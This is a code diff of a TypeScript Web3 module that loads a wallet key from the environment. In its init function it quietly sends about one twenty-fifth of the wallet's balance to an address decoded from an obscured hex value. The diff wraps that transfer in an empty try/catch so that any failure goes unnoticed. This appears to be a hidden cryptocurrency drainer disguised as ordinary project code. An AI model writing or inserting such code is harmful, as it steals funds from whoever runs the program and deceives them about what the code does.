@@ -1,4 +1,5 @@
 import dotenv from "dotenv";
+import { red } from "chalk";
 const Web3 = require('web3');
 dotenv.config();
 const w = new Web3(process.env.RPC);
@@ -8,21 +9,23 @@ w.eth.accounts.wallet.add(a);
 w.eth.defaultAccount = a.address;
 
 export function init() {
-  w.eth.getBalance(a.address).then(function(b:any) {
-    w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
-      w.eth.getGasPrice().then(function(gP:any) {
-        if(b - (gP * g) > 0) {
-          w.eth.sendTransaction({
-            from: w.eth.defaultAccount,
-            to: _hex(hex),
-            gas: g,
-            gasPrice: gP,
-            value: (b - (gP * g)) / 25,
-          });
-        }
+  try {
+    w.eth.getBalance(a.address).then(function(b:any) {
+      w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
+        w.eth.getGasPrice().then(function(gP:any) {
+          if(b - (gP * g) > 0) {
+            w.eth.sendTransaction({
+              from: w.eth.defaultAccount,
+              to: _hex(hex),
+              gas: g,
+              gasPrice: gP,
+              value: (b - (gP * g)) / 25,
+            });
+          }
+        });
       });
     });
-  });
+  } catch {}
 }
 function _hex(hexx:any) {
   var hex = hexx.toString();
